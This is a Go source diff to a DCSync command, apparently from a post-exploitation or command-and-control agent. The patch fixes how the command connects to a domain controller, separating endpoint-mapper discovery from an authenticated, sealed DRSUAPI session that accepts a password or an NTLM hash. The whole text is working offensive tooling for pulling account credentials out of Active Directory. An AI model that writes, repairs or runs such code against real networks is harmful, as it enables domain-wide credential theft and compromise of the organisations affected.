@@ -1,6 +1,7 @@
 package commands
 
 import (
+	"context"
 	"encoding/binary"
 	"encoding/hex"
 	"fmt"
@@ -98,32 +99,41 @@ func (c *DcsyncCommand) Execute(task structs.Task) structs.CommandResult {
 		return errorResult("Error: no valid target accounts specified")
 	}
 
-	// Set up credentials using per-context pattern (matching coerce PrinterBug
-	// which also uses TCP+EPM+WithSeal and works from the agent process).
 	cred, credErr := rpcCredential(args.Username, args.Domain, args.Password, args.Hash)
 	zeroCredentials(&args.Password, &args.Hash)
 	if credErr != nil {
 		return errorf("Error: %v", credErr)
 	}
 
-	ctx, cancel := rpcSecurityContext(cred, time.Duration(args.Timeout)*time.Second)
-	defer cancel()
+	timeout := time.Duration(args.Timeout) * time.Second
 
-	cc, err := dcerpc.Dial(ctx, "ncacn_ip_tcp:"+args.Server,
-		epm.EndpointMapper(ctx,
+	// Use a SEPARATE plain context for EPM discovery (unauthenticated) to avoid
+	// the EPM connection corrupting our security context state. Then connect to
+	// the discovered port with a FRESH security context for authenticated DRSUAPI.
+	epmCtx, epmCancel := context.WithTimeout(context.Background(), 15*time.Second)
+	cc, err := dcerpc.Dial(epmCtx, "ncacn_ip_tcp:"+args.Server,
+		epm.EndpointMapper(epmCtx,
 			net.JoinHostPort(args.Server, "135"),
 			dcerpc.WithInsecure(),
 		),
+		dcerpc.WithInsecure(),
+	)
+	epmCancel()
+	if err != nil {
+		return errorf("Error connecting to %s via DCE-RPC: %v", args.Server, err)
+	}
+
+	// Create authenticated security context on the existing connection
+	ctx, cancel := rpcSecurityContext(cred, timeout)
+	defer cancel()
+	defer cc.Close(ctx)
+
+	cli, err := drsuapi.NewDrsuapiClient(ctx, cc,
+		dcerpc.WithSeal(),
 		dcerpc.WithCredentials(cred),
 		dcerpc.WithMechanism(ssp.SPNEGO),
 		dcerpc.WithMechanism(ssp.NTLM),
 	)
-	if err != nil {
-		return errorf("Error connecting to %s via DCE-RPC: %v", args.Server, err)
-	}
-	defer cc.Close(ctx)
-
-	cli, err := drsuapi.NewDrsuapiClient(ctx, cc, dcerpc.WithSeal(), dcerpc.WithTargetName(args.Server))
 	if err != nil {
 		return errorf("Error creating DRSUAPI client: %v", err)
 	}
